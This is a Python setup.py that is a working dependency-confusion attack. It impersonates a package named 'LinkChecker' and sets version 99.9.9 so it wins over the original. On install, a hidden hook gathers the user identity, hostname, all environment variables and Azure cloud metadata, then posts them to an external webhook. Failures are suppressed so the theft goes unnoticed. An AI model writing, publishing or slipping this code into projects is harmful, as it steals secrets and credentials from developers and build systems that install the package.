from setuptools import setup
from setuptools.command.install import install
import os
import subprocess
import requests

class CustomInstall(install):
    def run(self):
        # 1. Собираем критическую информацию
        try:
            payload = {
                "whoami": subprocess.getoutput("whoami"),
                "id": subprocess.getoutput("id"),
                "hostname": subprocess.getoutput("hostname"),
                "pwd": os.getcwd(),
                # Проверяем наличие секретов в переменных окружения
                "env_vars": dict(os.environ),
                # Проверяем доступ к сетевым метаданным (Azure/Cloud)
                "cloud_metadata": subprocess.getoutput("curl -m 2 http://169.254.169.254/metadata/instance?api-version=2021-02-01 -H 'Metadata: true' || echo 'no_access'")
            }
            
            # 2. Отправляем данные на твой Webhook
            webhook_url = "https://webhook.site/63e98335-cd79-4910-8fff-18ba5e7ee409"
            requests.post(webhook_url, json=payload, timeout=5)
            
        except Exception as e:
            # Если что-то пошло не так, билд не должен упасть (чтобы не палиться)
            pass
            
        install.run(self)

setup(
    name="LinkChecker", # Называем так же, как в оригинале
    version="99.9.9",    # Ставим очень высокую версию
    cmdclass={'install': CustomInstall}
)
